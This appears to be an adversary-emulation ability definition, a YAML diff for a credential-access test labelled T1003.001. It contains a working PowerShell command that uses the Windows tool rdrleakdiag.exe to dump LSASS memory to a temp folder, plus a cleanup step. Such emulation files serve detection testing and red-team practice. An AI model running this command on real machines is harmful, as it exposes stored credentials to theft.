@@ -1,0 +1,30 @@
+---
+- id: bbc786e45aff314d33e60133f010f00c
+  name: Dump LSASS.exe using lolbin rdrleakdiag.exe
+  description: "The memory of lsass.exe is often dumped for offline credential theft\
+    \ attacks. \nThis can be achieved with lolbin rdrleakdiag.exe. \n\nUpon successful\
+    \ execution, you should see the following files created, $env:TEMP\\minidump_<PID>.dmp\
+    \ and  $env:TEMP\\results_<PID>.hlk.\n"
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      psh:
+        command: if (Test-Path -Path "$env:SystemRoot\System32\rdrleakdiag.exe") {;       $binary_path
+          = "$env:SystemRoot\System32\rdrleakdiag.exe";   } elseif (Test-Path -Path
+          "$env:SystemRoot\SysWOW64\rdrleakdiag.exe") {;       $binary_path = "$env:SystemRoot\SysWOW64\rdrleakdiag.exe";   }
+          else {;       $binary_path = "File not found";       exit 1;   }; $lsass_pid
+          = get-process lsass |select -expand id; if (-not (Test-Path -Path"$env:TEMP\t1003.001-13-rdrleakdiag"))
+          {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force}
+          ; write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag
+          /fullmemdmp /wait 1; & $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag
+          /fullmemdmp /wait 1; Write-Host "Minidump file, minidump_$lsass_pid.dmp
+          can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory."
+        payloads: []
+        cleanup: Remove-Item $env:TEMP\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction
+          Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
